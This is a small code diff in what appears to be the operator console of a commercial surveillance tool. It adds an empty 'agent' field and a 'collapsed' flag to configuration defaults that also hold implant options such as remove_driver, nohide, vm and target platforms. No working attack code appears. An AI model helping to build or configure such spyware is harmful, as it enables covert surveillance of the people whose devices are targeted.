@@ -117,6 +117,7 @@ package it.ht.rcs.console
           usb: false,
           vm: 0,
           mobile: false,
+          agent: '',
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -226,7 +227,8 @@ package it.ht.rcs.console
                              remove_driver: true,
                              nohide: [],
                              type: agent.type,
-                             advanced: false
+                             advanced: false,
+                             collapsed: false
                            };
       
       return globals;
